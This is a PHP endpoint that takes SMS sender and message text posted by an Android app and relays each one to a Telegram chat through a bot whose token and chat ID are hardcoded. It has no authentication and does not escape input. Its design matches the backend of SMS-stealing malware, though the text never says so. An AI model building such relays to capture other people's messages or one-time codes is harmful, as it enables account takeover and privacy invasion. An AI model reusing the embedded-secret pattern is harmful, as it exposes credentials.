<?php
// Telegram Bot Config
$botToken = "8872506769:AAFWovOaYbd6kojRWByEZbKb-ptojuiQLgc";
$chatId = "-1004419945291";

// Get POST data from Android app
$sender = $_POST['sender'] ?? 'Unknown';
$message = $_POST['message'] ?? 'No message';

// Format the message for Telegram
$telegramMessage = "📩 *New SMS Received!*\n";
$telegramMessage .= "📱 *From:* `" . $sender . "`\n";
$telegramMessage .= "💬 *Message:* " . $message . "\n";
$telegramMessage .= "🕐 *Time:* " . date('Y-m-d H:i:s');

// Send to Telegram
$telegramUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $telegramMessage,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Return JSON response
header('Content-Type: application/json');
if ($httpCode == 200) {
    echo json_encode(['status' => 'success', 'message' => 'SMS forwarded to Telegram']);
} else {
    echo json_encode(['status' => 'error', 'http_code' => $httpCode, 'response' => $response]);
}
?>